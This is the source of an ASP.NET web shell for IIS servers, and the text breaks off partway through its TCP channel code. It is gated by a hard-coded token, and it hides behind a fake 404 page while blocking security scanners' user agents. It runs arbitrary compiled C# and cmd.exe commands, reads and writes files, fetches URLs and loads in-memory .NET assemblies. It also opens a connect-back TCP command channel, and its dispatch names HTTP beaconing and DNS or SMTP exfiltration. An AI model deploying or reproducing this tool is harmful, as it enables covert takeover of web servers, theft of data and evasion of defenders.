<%@ Page Language="C#" ValidateRequest="false" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Xml" %>
<%@ Import Namespace="System.Xml.Xsl" %>
<%@ Import Namespace="System.Xml.XPath" %>
<%@ Import Namespace="System.Drawing" %>
<%@ Import Namespace="System.Web.Configuration" %>
<%@ Import Namespace="System.CodeDom.Compiler" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="Microsoft.CSharp" %>
<%@ Import Namespace="System.Security" %>
<%@ Import Namespace="System.Security.Permissions" %>

<script runat="server">
    // ============================================================
    // Access Control (same gating pattern as the main loader)
    // ============================================================
    static readonly string[] ALLOWED_HOSTS = new string[] {
        "localhost",
        "attacker2.yourdomain.com"
    };

    const string ACCESS_TOKEN = "0xsp.com"; // change the pwd
    static readonly string[] ALLOWED_IPS = new string[] { };
    const bool ENFORCE_HOST_CHECK = false; // enable or disable 
    const bool ENFORCE_IP_CHECK = false;  // enable or disable this feature , default is false. 

    private bool ValidateAccess()
    {
        string token = Request.QueryString["k"];
        if (string.IsNullOrEmpty(token))
            token = Request.Headers["X-Auth-Token"];  // if you wanna connect via requester then pass this in request's header. 
        if (string.IsNullOrEmpty(token) || token != ACCESS_TOKEN)
        { Send404(); return false; }

        if (ENFORCE_HOST_CHECK && ALLOWED_HOSTS.Length > 0)
        {
            string host = Request.Url.Host.ToLower();
            bool ok = false;
            foreach (string h in ALLOWED_HOSTS)
            { if (host == h.ToLower()) { ok = true; break; } }
            if (!ok) { Send404(); return false; }
        }

        if (ENFORCE_IP_CHECK && ALLOWED_IPS.Length > 0)
        {
            string cip = Request.ServerVariables["REMOTE_ADDR"];
            string xff = Request.Headers["X-Forwarded-For"];
            if (!string.IsNullOrEmpty(xff)) cip = xff.Split(',')[0].Trim();
            bool ok = false;
            foreach (string ip in ALLOWED_IPS)
            { if (cip == ip) { ok = true; break; } }
            if (!ok) { Send404(); return false; }
        }

        string ua = (Request.UserAgent ?? "").ToLower();

        string[] bl = { "nikto","sqlmap","nessus","openvas","masscan",
            "zgrab","gobuster","dirbuster","wpscan","burp",
            "qualys","nmap","acunetix","nuclei","httpx" }; // you can amend this array 
        foreach (string b in bl)
        { if (ua.Contains(b)) { Send404(); return false; } }

        return true;
    }

    private void Send404()
    {
        Response.Clear();
        Response.StatusCode = 404;
        Response.StatusDescription = "Not Found";
        Response.ContentType = "text/html";
        Response.Write("<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n");
        Response.Write("<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head>\r\n");
        Response.Write("<title>404 - File or directory not found.</title>\r\n");
        Response.Write("<style type=\"text/css\">body{margin:0;font-size:.7em;font-family:Verdana,Arial,Helvetica,sans-serif;background:#EEEEEE;}");
        Response.Write("fieldset{padding:0 15px 10px 15px;}h1{font-size:2.4em;margin:0;color:#FFF;}");
        Response.Write("h2{font-size:1.7em;margin:0;color:#CC0000;}h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}");
        Response.Write("#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:\"trebuchet MS\",Verdana,sans-serif;color:#FFF;background-color:#555555;}");
        Response.Write("#content{margin:0 0 0 2%;position:relative;}</style>\r\n</head>\r\n<body>\r\n");
        Response.Write("<div id=\"header\"><h1>Server Error</h1></div>\r\n");
        Response.Write("<div id=\"content\">\r\n<div class=\"content-container\">\r\n");
        Response.Write("<fieldset><h2>404 - File or directory not found.</h2>\r\n");
        Response.Write("<h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3>\r\n");
        Response.Write("</fieldset></div></div>\r\n</body>\r\n</html>");
        Response.End();
    }



    private bool _engineXslt = false;
    private bool _engineCodeDom = true;
    private bool _engineManaged = true; // always available

    // Safe wrapper: many Environment.* properties require EnvironmentPermission
    // which is denied under Medium trust
    private string SafeGet(Func<string> fn, string fallback)
    {
        try { return fn(); }
        catch { return fallback; }
    }

    private string CheckEnvironment()
    {
        StringBuilder sb = new StringBuilder();
        bool is64 = IntPtr.Size == 8;
        sb.Append("CLR: " + SafeGet(() => Environment.Version.ToString(), "?"));
        sb.Append(" | OS: " + SafeGet(() => Environment.OSVersion.VersionString, "restricted"));
        sb.Append(" | Proc: " + (is64 ? "x64" : "x86"));

        // Check trust level from config
        string trust = "Unknown";
        try
        {
            if (System.Web.Hosting.HostingEnvironment.IsHosted)
            {
                var ts = (TrustSection)WebConfigurationManager.GetSection("system.web/trust");
                if (ts != null) trust = ts.Level;
            }
        }
        catch { trust = "Restricted"; }
        sb.Append(" | Trust: " + trust);

        // Probe: Can P/Invoke work?
        bool canPInvoke = false;
        try
        {
            var sp = new System.Security.Permissions.SecurityPermission(
                System.Security.Permissions.SecurityPermissionFlag.UnmanagedCode);
            sp.Demand();
            canPInvoke = true;
        }
        catch { }
        sb.Append(" | P/Invoke: " + (canPInvoke ? "Yes" : "No"));

        // Probe engines via isolated methods (JIT-safe)
        try { _engineXslt = ProbeXsltEngine(); } catch { _engineXslt = false; }
        try { _engineCodeDom = ProbeCodeDomEngine(); } catch { _engineCodeDom = false; }

        sb.Append(" | IIS Engines: ");
        List<string> engines = new List<string>();
        if (_engineXslt) engines.Add("XSLT");
        if (_engineCodeDom) engines.Add("CodeDom");
        engines.Add("Managed");
        sb.Append(string.Join(", ", engines.ToArray()));

        if (_engineXslt || _engineCodeDom)
        {
            sb.Insert(0, "READY | ");
            lblStatus.ForeColor = ColorTranslator.FromHtml("#4a9");
        }
        else
        {
            sb.Insert(0, "LIMITED | ");
            sb.Append(" | Managed-only mode (no dynamic compilation!)");
            lblStatus.ForeColor = ColorTranslator.FromHtml("#f0a500");
        }

        return sb.ToString();
    }

    // Isolated probe: XSLT script compilation (Full Trust)
    // Must be a separate method so JIT demands don't poison / conflict with CheckEnvironment
    [System.Runtime.CompilerServices.MethodImpl(
        System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
    private bool ProbeXsltEngine()
    {
        XslCompiledTransform xsl = new XslCompiledTransform();
        string testXsl = @"<?xml version='1.0'?>
<xsl:stylesheet version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform'
  xmlns:msxsl='urn:schemas-microsoft-com:xslt' xmlns:cs='urn:cs-test'>
  <msxsl:script language='C#' implements-prefix='cs'>
    public string Ping() { return ""ok""; }
  </msxsl:script>
  <xsl:template match='/'><xsl:value-of select='cs:Ping()'/></xsl:template>
</xsl:stylesheet>";
        XsltSettings settings = new XsltSettings(false, true);
        using (StringReader sr = new StringReader(testXsl))
        using (XmlReader xr = XmlReader.Create(sr))
            xsl.Load(xr, settings, null);

        StringBuilder output = new StringBuilder();
        using (StringReader sr = new StringReader("<r/>"))
        using (XmlReader xr = XmlReader.Create(sr))
        using (StringWriter sw = new StringWriter(output))
            xsl.Transform(xr, null, sw);

        return output.ToString().Contains("ok");
    }

    // Isolated probe: CSharpCodeProvider compilation (High Trust)
    [System.Runtime.CompilerServices.MethodImpl(
        System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
    private bool ProbeCodeDomEngine()
    {
        CSharpCodeProvider csc = new CSharpCodeProvider();
        CompilerParameters cp = new CompilerParameters();
        cp.GenerateInMemory = true;
        cp.GenerateExecutable = false;
        cp.ReferencedAssemblies.Add("System.dll");
        CompilerResults cr = csc.CompileAssemblyFromSource(cp,
            "public class _T { public static string Go() { return \"ok\"; } }");
        if (cr.Errors.HasErrors) return false;
        Type t = cr.CompiledAssembly.GetType("_T");
        object r = t.GetMethod("Go").Invoke(null, null);
        return (r != null && r.ToString() == "ok");
    }


    private string BuildStylesheet(string csharpCode, string extraImports)
    {
        // In msxsl:script, the CDATA content is compiled as a class body,
        // NOT as a full compilation unit. So 'using' statements cannot go
        // inside <![CDATA[]]>. Instead, we use <msxsl:using> elements for
        // namespace imports and <msxsl:assembly> for assembly references.

        StringBuilder usingElements = new StringBuilder();

        // Default namespaces always available
        string[] defaultNs = new string[] {
            "System",
            "System.IO",
            "System.Text",
            "System.Diagnostics",
            "System.Net",
            "System.Reflection",
            "System.Collections.Generic"
        };

        foreach (string ns in defaultNs)
            usingElements.AppendLine("    <msxsl:using namespace='" + ns + "' />");

        // Parse extra imports (comma-separated)
        if (!string.IsNullOrEmpty(extraImports))
        {
            string[] extras = extraImports.Split(new char[] { ',', ';', '\n' },
                StringSplitOptions.RemoveEmptyEntries);
            foreach (string ns in extras)
            {
                string trimmed = ns.Trim();
                if (!string.IsNullOrEmpty(trimmed))
                    usingElements.AppendLine("    <msxsl:using namespace='" + trimmed + "' />");
            }
        }


        string xslt = @"<?xml version='1.0' encoding='UTF-8'?>
<xsl:stylesheet version='1.0'
  xmlns:xsl='http://www.w3.org/1999/XSL/Transform'
  xmlns:msxsl='urn:schemas-microsoft-com:xslt'
  xmlns:payload='urn:payload'>

  <msxsl:script language='C#' implements-prefix='payload'>
" + usingElements.ToString() + @"
    <msxsl:assembly name='System' />
    <msxsl:assembly name='System.Core' />

    <![CDATA[
" + csharpCode + @"
    ]]>
  </msxsl:script>

  <xsl:template match='/'>
    <output>
      <xsl:value-of select='payload:Go()'/>
    </output>
  </xsl:template>
</xsl:stylesheet>";

        return xslt;
    }

    // ============================================================
    // Engine 1: XSLT (Full Trust only)
    // ============================================================
    private string ExecuteXslt(string stylesheet, StringBuilder log)
    {
        log.AppendLine("Engine: XSLT (msxsl:script)");
        log.AppendLine("Compiling stylesheet...");

        XslCompiledTransform xsl = new XslCompiledTransform(false);
        XsltSettings settings = new XsltSettings(false, true);

        using (StringReader sr = new StringReader(stylesheet))
        using (XmlReader xr = XmlReader.Create(sr))
            xsl.Load(xr, settings, null);

        log.AppendLine("Compilation successful.");
        log.AppendLine("Executing...");

        StringBuilder output = new StringBuilder();
        XmlWriterSettings ws = new XmlWriterSettings();

        ws.OmitXmlDeclaration = true;
        ws.ConformanceLevel = ConformanceLevel.Fragment;
        ws.Encoding = Encoding.UTF8;

        using (StringReader sr = new StringReader("<input/>"))
        using (XmlReader xr = XmlReader.Create(sr))
        using (XmlWriter xw = XmlWriter.Create(output, ws))
            xsl.Transform(xr, null, xw);

        string raw = output.ToString();
        try
        {
            XmlDocument doc = new XmlDocument();
            doc.LoadXml(raw);
            XmlNode node = doc.SelectSingleNode("//output");
            if (node != null) return node.InnerText;
        }
        catch { }

        return raw;
    }


    private string ExecuteCodeDom(string csharpCode, string extraImports, StringBuilder log)
    {
        log.AppendLine("Engine: CodeDom (CSharpCodeProvider)");
        log.AppendLine("Building source...");

        // Wrap the user's method(s) into a full class
        StringBuilder src = new StringBuilder();
        string[] defaultNs = new string[] {
            "System", "System.IO", "System.Text", "System.Diagnostics",
            "System.Net", "System.Reflection", "System.Collections.Generic"
        };
        foreach (string ns in defaultNs)
            src.AppendLine("using " + ns + ";");

        if (!string.IsNullOrEmpty(extraImports))
        {
            string[] extras = extraImports.Split(new char[] { ',', ';', '\n' },
                StringSplitOptions.RemoveEmptyEntries);
            foreach (string ns in extras)
            {
                string trimmed = ns.Trim();
                if (!string.IsNullOrEmpty(trimmed))
                    src.AppendLine("using " + trimmed + ";");
            }
        }

        src.AppendLine("public class _Payload {");
        src.AppendLine(csharpCode);
        src.AppendLine("}");

        string source = src.ToString();
        log.AppendLine("Source size: " + source.Length + " chars");
        log.AppendLine("Compiling...");

        CSharpCodeProvider csc = new CSharpCodeProvider();
        CompilerParameters cp = new CompilerParameters();
        cp.GenerateInMemory = true;
        cp.GenerateExecutable = false;
        cp.ReferencedAssemblies.Add("System.dll");
        cp.ReferencedAssemblies.Add("System.Core.dll");
        cp.ReferencedAssemblies.Add("System.Xml.dll");
        cp.ReferencedAssemblies.Add("System.Data.dll");

        CompilerResults cr = csc.CompileAssemblyFromSource(cp, source);

        if (cr.Errors.HasErrors)
        {
            StringBuilder errors = new StringBuilder();
            errors.AppendLine("Compilation failed:");
            foreach (CompilerError ce in cr.Errors)
            {
                if (!ce.IsWarning)
                    errors.AppendLine("  Line " + ce.Line + ": " + ce.ErrorText);
            }
            log.AppendLine(errors.ToString());
            return errors.ToString();
        }

        log.AppendLine("Compilation successful.");
        log.AppendLine("Executing...");

        Type t = cr.CompiledAssembly.GetType("_Payload");
        MethodInfo mi = t.GetMethod("Go", BindingFlags.Public | BindingFlags.Instance | BindingFlags.Static);
        if (mi == null)
            return "Error: No Go() method found in compiled code.";

        object instance = mi.IsStatic ? null : Activator.CreateInstance(t);
        object result = mi.Invoke(instance, null);
        return result != null ? result.ToString() : "(Go returned null)";
    }

    // ============================================================
    // Engine 3: Managed-only (Medium / High Trust)
    // Pre-built operations executed directly - no compilation needed - watch OrangeCon talk :)
    // ============================================================
    private string ExecuteManaged(string action, string args, StringBuilder log)
    {
        log.AppendLine("Engine: Managed (direct, no compilation)");
        log.AppendLine("Action: " + action);

        switch (action)
        {
            case "m_sysinfo":
                return ManagedSysInfo();
            case "m_cmd":
                return ManagedCmd(args);
            case "m_ls":
                return ManagedLs(args);
            case "m_read":
                return ManagedReadFile(args);
            case "m_write":
                return ManagedWriteFile(args);
            case "m_download":
                return ManagedDownloadUrl(args);
            case "m_assembly": // Load a fucking .net asm 
                return ManagedLoadAssembly(args);
            case "m_env":
                return ManagedEnvVars();
            case "t_tcpshell": // RAW TCP socket 
                return TechniqueTcpShell(args);
            case "t_httpbeacon": // HTTP beaconing 
                return TechniqueHttpBeacon(args);
            case "t_sqlc2":
                return TechniqueSqlC2(args);
            case "t_smtp":
                return TechniqueSmtpExfil(args);
            case "t_filec2":
                return TechniqueFileC2(args);
            case "t_dns":
                return TechniqueDnsExfil(args);
            default:
                return "Unknown managed action: " + action;
        }
    }
    /// 
    /// you can modify starting from this section, modifying functions based on your objectivies.  
    ///
    private string ManagedSysInfo()
    {
        StringBuilder sb = new StringBuilder();
        sb.AppendLine("=== Environment ===");
        sb.AppendLine("Computer: " + SafeGet(() => Environment.MachineName, "(denied)"));
        sb.AppendLine("User: " + SafeGet(() => Environment.UserDomainName + "\\" + Environment.UserName, "(denied)"));
        sb.AppendLine("OS: " + SafeGet(() => Environment.OSVersion.ToString(), "(denied)"));
        sb.AppendLine("CLR: " + SafeGet(() => Environment.Version.ToString(), "(denied)"));
        sb.AppendLine("x64: " + (IntPtr.Size == 8));
        sb.AppendLine("Processors: " + SafeGet(() => Environment.ProcessorCount.ToString(), "(denied)"));
        sb.AppendLine("Directory: " + SafeGet(() => Environment.CurrentDirectory, "(denied)"));
        sb.AppendLine();

        sb.AppendLine("=== Process ===");
        try
        {
            var p = System.Diagnostics.Process.GetCurrentProcess();
            sb.AppendLine("PID: " + p.Id);
            sb.AppendLine("Name: " + SafeGet(() => p.ProcessName, "(denied)"));
            sb.AppendLine("Memory: " + SafeGet(() => (p.WorkingSet64 / 1024 / 1024) + " MB", "(denied)"));
        }
        catch (Exception ex) { sb.AppendLine("Error: " + ex.Message); }
        sb.AppendLine();

        sb.AppendLine("=== Network ===");
        try
        {
            string host = System.Net.Dns.GetHostName();
            sb.AppendLine("Hostname: " + host);
            var addrs = System.Net.Dns.GetHostAddresses(host);
            foreach (var a in addrs) sb.AppendLine("  " + a);
        }
        catch (Exception ex) { sb.AppendLine("Error: " + ex.Message); }
        sb.AppendLine();

        sb.AppendLine("=== Drives ===");
        try
        {
            foreach (var d in DriveInfo.GetDrives())
            {
                try { sb.AppendLine("  " + d.Name + " " + d.DriveType + " " + d.VolumeLabel + " " + (d.TotalSize/1024/1024/1024) + "GB"); }
                catch { sb.AppendLine("  " + d.Name + " (unavailable)"); }
            }
        }
        catch (Exception ex) { sb.AppendLine("Error: " + ex.Message); }

        sb.AppendLine();
        sb.AppendLine("=== Allowed Operations ===");
        sb.AppendLine("File I/O (app dir): " + SafeGet(() => { new System.Security.Permissions.FileIOPermission(System.Security.Permissions.FileIOPermissionAccess.Read, HttpContext.Current.Server.MapPath("~")).Demand(); return "Yes"; }, "No"));
        sb.AppendLine("Process.Start: " + SafeGet(() => { new System.Security.Permissions.SecurityPermission(System.Security.Permissions.SecurityPermissionFlag.UnmanagedCode).Demand(); return "Yes"; }, "No"));
        sb.AppendLine("Assembly.Load: " + SafeGet(() => { new System.Security.Permissions.SecurityPermission(System.Security.Permissions.SecurityPermissionFlag.Execution).Demand(); return "Yes"; }, "No"));
        sb.AppendLine("DNS Resolve: " + SafeGet(() => { new System.Net.DnsPermission(System.Security.Permissions.PermissionState.Unrestricted).Demand(); return "Yes"; }, "No"));
        sb.AppendLine("Web Requests: " + SafeGet(() => { new System.Net.WebPermission(System.Security.Permissions.PermissionState.Unrestricted).Demand(); return "Yes"; }, "No"));

        return sb.ToString();
    }

    private string ManagedCmd(string args)
    {
        if (string.IsNullOrEmpty(args))
            return "No command provided. Set the args field.";

        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe"; // you can change this as well.
            psi.Arguments = "/c " + args;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            using (System.Diagnostics.Process p = System.Diagnostics.Process.Start(psi))
            {
                string stdout = p.StandardOutput.ReadToEnd();
                string stderr = p.StandardError.ReadToEnd();
                p.WaitForExit(15000);
                return stdout + stderr;
            }
        }
        catch (System.Security.SecurityException)
        {
            return "Process.Start denied at this trust level.\n"
                 + "Command execution requires High or Full trust.";
        }
    }

    private string ManagedLs(string args)
    {
        string path = string.IsNullOrEmpty(args) ? "C:\\" : args;
        StringBuilder sb = new StringBuilder();
        sb.AppendLine("Listing: " + path);
        sb.AppendLine();
        try
        {
            foreach (string d in Directory.GetDirectories(path))
            {
                var di = new DirectoryInfo(d);
                sb.AppendLine(string.Format(" {0,-20} {1,12} {2}",
                    di.LastWriteTime.ToString("yyyy-MM-dd HH:mm"), "<DIR>", di.Name));
            }
            foreach (string f in Directory.GetFiles(path))
            {
                var fi = new FileInfo(f);
                sb.AppendLine(string.Format(" {0,-20} {1,12} {2}",
                    fi.LastWriteTime.ToString("yyyy-MM-dd HH:mm"), fi.Length.ToString("N0"), fi.Name));
            }
        }
        catch (Exception ex) { sb.AppendLine("Error: " + ex.Message); }
        return sb.ToString();
    }

    private string ManagedReadFile(string args)
    {
        if (string.IsNullOrEmpty(args))
            return "No path provided. Set the args field.";
        if (!File.Exists(args))
            return "File not found: " + args;
        byte[] data = File.ReadAllBytes(args);
        return "Size: " + data.Length + " bytes\n\n" + Convert.ToBase64String(data);
    }

    private string ManagedWriteFile(string args)
    {
        // args format: "path|base64data" or "path|plaintext:content"
        if (string.IsNullOrEmpty(args) || !args.Contains("|"))
            return "Format: filepath|base64data  or  filepath|plaintext:content";

        int sep = args.IndexOf('|');
        string path = args.Substring(0, sep).Trim();
        string data = args.Substring(sep + 1);

        if (data.StartsWith("plaintext:"))
        {
            File.WriteAllText(path, data.Substring(10));
            return "Written " + data.Substring(10).Length + " chars to " + path;
        }
        else
        {
            byte[] raw = Convert.FromBase64String(data);
            File.WriteAllBytes(path, raw);
            return "Written " + raw.Length + " bytes to " + path;
        }
    }

    private string ManagedDownloadUrl(string args)
    {
        if (string.IsNullOrEmpty(args))
            return "No URL provided.";
        try
        {
            using (System.Net.WebClient wc = new System.Net.WebClient())
            {
                string content = wc.DownloadString(args);
                return "Downloaded " + content.Length + " chars from " + args + "\n\n" + content;
            }
        }
        catch (System.Security.SecurityException)
        {
            return "WebPermission denied at this trust level.\n"
                 + "Outbound HTTP requires High or Full trust.";
        }
    }

    private string ManagedLoadAssembly(string args)
    {
        if (string.IsNullOrEmpty(args))
            return "No assembly data. Paste base64 of .NET DLL in args field.\n\n"
                 + "Format:  BASE64_DATA\n"
                 + "   or:   BASE64_DATA|argument\n\n"
                 + "Use | to separate the base64 assembly from a runtime argument.\n"
                 + "The argument is passed to Run(string). Without |, Run() is called.";

        // Support passing runtime arguments after a pipe separator
        // Format: base64data|arg  (the arg is passed to Run(string))
        string b64 = args;
        string runArg = null;

        // Find the pipe separator — but only if it's NOT inside base64
        // Base64 uses A-Z, a-z, 0-9, +, /, = so | is safe as separator
        int pipeIdx = args.LastIndexOf('|');
        if (pipeIdx > 0)
        {
            // Verify everything before the pipe is valid base64
            string candidateB64 = args.Substring(0, pipeIdx).Trim();
            string candidateArg = args.Substring(pipeIdx + 1);
            try
            {
                Convert.FromBase64String(candidateB64);
                // If that worked, it's valid base64 — use the split
                b64 = candidateB64;
                runArg = candidateArg;
            }
            catch
            {
                // Not valid base64 before the pipe — treat entire input as base64
                b64 = args;
                runArg = null;
            }
        }

        byte[] raw = Convert.FromBase64String(b64.Trim());
        Assembly asm = Assembly.Load(raw);

        foreach (Type t in asm.GetExportedTypes())
        {
            // If we have a runtime argument, prefer Run(string)
            if (runArg != null)
            {
                MethodInfo miStr = t.GetMethod("Run",
                    BindingFlags.Public | BindingFlags.Static,
                    null, new Type[] { typeof(string) }, null);
                if (miStr != null)
                {
                    object result = miStr.Invoke(null, new object[] { runArg });
                    return result != null ? result.ToString() : "(Run returned null)";
                }
            }

            // Try Run() with no arguments
            MethodInfo mi = t.GetMethod("Run",
                BindingFlags.Public | BindingFlags.Static,
                null, Type.EmptyTypes, null);
            if (mi != null)
            {
                object result = mi.Invoke(null, null);
                return result != null ? result.ToString() : "(Run returned null)";
            }

            // Fallback: try Run(string) with empty string if no arg provided
            if (runArg == null)
            {
                MethodInfo miStr = t.GetMethod("Run",
                    BindingFlags.Public | BindingFlags.Static,
                    null, new Type[] { typeof(string) }, null);
                if (miStr != null)
                {
                    object result = miStr.Invoke(null, new object[] { "" });
                    return result != null ? result.ToString() : "(Run returned null)";
                }
            }
        }

        StringBuilder sb = new StringBuilder();
        sb.AppendLine("No static Run() found. Available types:");
        foreach (Type t in asm.GetExportedTypes())
        {
            sb.AppendLine("  " + t.FullName);
            foreach (MethodInfo mi in t.GetMethods(BindingFlags.Public | BindingFlags.Static))
                sb.AppendLine("    static " + mi.ReturnType.Name + " " + mi.Name + "(" +
                    string.Join(", ", Array.ConvertAll(mi.GetParameters(), p => p.ParameterType.Name + " " + p.Name)) + ")");
        }
        return sb.ToString();
    }

    private string ManagedEnvVars()
    {
        StringBuilder sb = new StringBuilder();
        sb.AppendLine("=== Environment Variables ===");
        try
        {
            var vars = Environment.GetEnvironmentVariables();
            var keys = new List<string>();
            foreach (System.Collections.DictionaryEntry kv in vars)
                keys.Add(kv.Key.ToString());
            keys.Sort();
            foreach (string key in keys)
                sb.AppendLine(key + " = " + vars[key]);
        }
        catch (System.Security.SecurityException)
        {
            sb.AppendLine("(EnvironmentPermission denied at this trust level)");
            sb.AppendLine();
            sb.AppendLine("Readable via HttpContext:");
            try { sb.AppendLine("  Server.MachineName: " + HttpContext.Current.Server.MachineName); } catch { }
            try { sb.AppendLine("  Request.Url: " + HttpContext.Current.Request.Url); } catch { }
            try { sb.AppendLine("  Request.UserHostAddress: " + HttpContext.Current.Request.UserHostAddress); } catch { }
            try { sb.AppendLine("  App physical path: " + HttpContext.Current.Request.PhysicalApplicationPath); } catch { }
        }
        return sb.ToString();
    }



    private string GetAppPath()
    {
        try { return HttpContext.Current.Request.PhysicalApplicationPath; }
        catch
        {
            try { return HttpContext.Current.Server.MapPath("~"); }
            catch { return null; }
        }
    }

  
    private string RunManagedTask(string task)
    {
        if (string.IsNullOrEmpty(task)) return "No task specified";
        string lower = task.ToLower().Trim();

        try
        {
            if (lower == "sysinfo" || lower == "info")
            {
                StringBuilder si = new StringBuilder();
                si.AppendLine("Machine: " + SafeGet(() => Environment.MachineName, "?"));
                si.AppendLine("User: " + SafeGet(() => Environment.UserDomainName + "\\" + Environment.UserName, "?"));
                si.AppendLine("OS: " + SafeGet(() => Environment.OSVersion.ToString(), "?"));
                si.AppendLine("CLR: " + SafeGet(() => Environment.Version.ToString(), "?"));
                si.AppendLine("64bit: " + Environment.Is64BitProcess);
                si.AppendLine("AppDir: " + SafeGet(() => AppDomain.CurrentDomain.BaseDirectory, "?"));
                si.AppendLine("CWD: " + SafeGet(() => Directory.GetCurrentDirectory(), "?"));
                si.AppendLine("TempDir: " + SafeGet(() => Path.GetTempPath(), "?"));
                return si.ToString();
            }
            else if (lower == "ls" || lower == "dir" || lower.StartsWith("ls ") || lower.StartsWith("dir "))
            {
                string dir = ".";
                int spIdx = task.IndexOf(' ');
                if (spIdx >= 0) dir = task.Substring(spIdx + 1).Trim();
                if (string.IsNullOrEmpty(dir)) dir = ".";
                StringBuilder ls = new StringBuilder();
                ls.AppendLine("Listing: " + Path.GetFullPath(dir));
                foreach (string d in Directory.GetDirectories(dir))
                    ls.AppendLine("DIR  " + Path.GetFileName(d));
                foreach (string f in Directory.GetFiles(dir))
                {
                    FileInfo fi = new FileInfo(f);
                    ls.AppendLine(fi.Length.ToString().PadLeft(12) + "  " + fi.Name);
                }
                return ls.ToString();
            }
            else if (lower.StartsWith("cat ") || lower.StartsWith("read "))
            {
                string fp = task.Substring(task.IndexOf(' ') + 1).Trim();
                return File.ReadAllText(fp);
            }
            else if (lower.StartsWith("dl ") || lower.StartsWith("download "))
            {
                string fp = task.Substring(task.IndexOf(' ') + 1).Trim();
                return "FILE:" + Convert.ToBase64String(File.ReadAllBytes(fp));
            }
            else if (lower.StartsWith("write ") || lower.StartsWith("upload "))
            {
                // write path|base64data  or  write path|plaintext
                string rest = task.Substring(task.IndexOf(' ') + 1).Trim();
                int sep = rest.IndexOf('|');
                if (sep < 0) return "Format: write path|data";
                string fp = rest.Substring(0, sep).Trim();
                string data = rest.Substring(sep + 1);
                try
                {
                    byte[] bytes = Convert.FromBase64String(data.Trim());
                    File.WriteAllBytes(fp, bytes);
                }
                catch (FormatException) { File.WriteAllText(fp, data); }
                return "Written: " + fp;
            }
            else if (lower.StartsWith("asm ") || lower.StartsWith("loadasm "))
            {
                string rest = task.Substring(task.IndexOf(' ') + 1).Trim();
                return ManagedLoadAssembly(rest);
            }
            else if (lower == "env")
            {
                return ManagedEnvVars();
            }
            else if (lower == "pwd")
            {
                return SafeGet(() => Directory.GetCurrentDirectory(), "denied");
            }
            else
            {
                return "Unknown task: " + task + "\n"
                    + "Available: sysinfo, ls <path>, cat <file>, dl <file>, write path|data, asm <b64>, env, pwd\n"
                    + "NOTE: cmd/shell execution requires Full Trust (Process.Start needs UnmanagedCode permission)";
            }
        }
        catch (Exception ex)
        {
            return "ERR: " + ex.GetType().Name + ": " + ex.Message;
        }
    }

    // ===========================================================
    // T1: TCP C2 Channel (High Trust)
    //  @zux03a  High trust 
    // Uses System.Net.Sockets.TcpClient — allowed under High Trust.
    // Since Process.Start is blocked, this provides a managed-only
    // interactive channel: file ops, assembly loading, recon.
    //
    // The operator connects via netcat and issues managed commands.
    // NOT a shell — it's a managed task executor over TCP.
    //
    // Usage: args = "host:port"     (connect-back)
    //        args = "bind:port"     (listen)
    //        args empty = probe
    // ===========================================================

    [System.Runtime.CompilerServices.MethodImpl(
        System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
    private string TechniqueTcpShell(string args)
    {
        StringBuilder sb = new StringBuilder();
        sb.AppendLine("=== T1: TCP Channel (High Trust) ===");
        sb.AppendLine();

        if (string.IsNullOrEmpty(args) || !args.Contains(":"))
        {
            sb.AppendLine("Usage: provide host:port in the args field");
            sb.AppendLine("  Connect-back: 10.0.0.5:4444");
            sb.AppendLine("  Listener:     nc -lvp 4444");
            sb.AppendLine();
            sb.AppendLine("NOTE: This is NOT a cmd shell. Process.Start requires");
            sb.AppendLine("UnmanagedCode permission which is denied under High Trust.");
            sb.AppendLine("Available commands over TCP:");
            sb.AppendLine("  sysinfo, ls <path>, cat <file>, dl <file>,");
            sb.AppendLine("  write path|data, asm <base64>, env, pwd, exit");
            sb.AppendLine();
            sb.AppendLine("[*] Probing socket permission...");
            try
            {
                new System.Net.SocketPermission(System.Security.Permissions.PermissionState.Unrestricted).Demand();
                sb.AppendLine("[+] SocketPermission: ALLOWED");
            }
            catch { sb.AppendLine("[-] SocketPermission: DENIED (need High Trust)"); }
            return sb.ToString();
        }

        string[] parts = args.Split(new char[] { ':' }, 2);
        string host = parts[0].Trim();
        int port;
        if (!int.TryParse(parts[1].Trim(), out port))
        {
            sb.AppendLine("[-] Invalid port: " + parts[1]);
            return sb.ToString();
        }

        sb.AppendLine("[*] Connecting to " + host + ":" + port + "...");

        try
        {
            using (var client = new System.Net.Sockets.TcpClient())
            {
                client.Connect(host, port);
                sb.AppendLine("[+] Connected!");

                using (var stream = client.GetStream())
                {
                    byte[] banner = Encoding.UTF8.GetBytes(
                        "=== IIS Managed Agent [" + SafeGet(() => Environment.MachineName, "?") + "] ===\r\n"
                        + "Commands: sysinfo, ls <path>, cat <file>, dl <file>,\r\n"
                        + "          write path|data, asm <base64>, env, pwd, exit\r\n"
                        + "NOTE: No cmd/shell — Process.Start blocked at this trust level.\r\n\r\n"
                    );
                    stream.Write(banner, 0, banner.Length);

                    while (client.Connected)
                    {
                        byte[] prompt = Encoding.UTF8.GetBytes("AGENT> ");
                        stream.Write(prompt, 0, prompt.Length);

                        StringBuilder cmdBuf = new StringBuilder();
                        while (true)
                        {
                            int b = stream.ReadByte();
                            if (b == -1) goto done;
                            if (b == 10 || b == 13)
                            {
                                if (cmdBuf.Length > 0) break;
                                continue;
                            }
                            cmdBuf.Append((char)b);
                        }

                        string cmd = cmdBuf.ToString().Trim();
                        if (cmd.ToLower() == "exit" || cmd.ToLower() == "quit") break;

                        string output = RunManagedTask(cmd) + "\r\n";
                        byte[] outBytes = Encoding.UTF8.GetBytes(output);
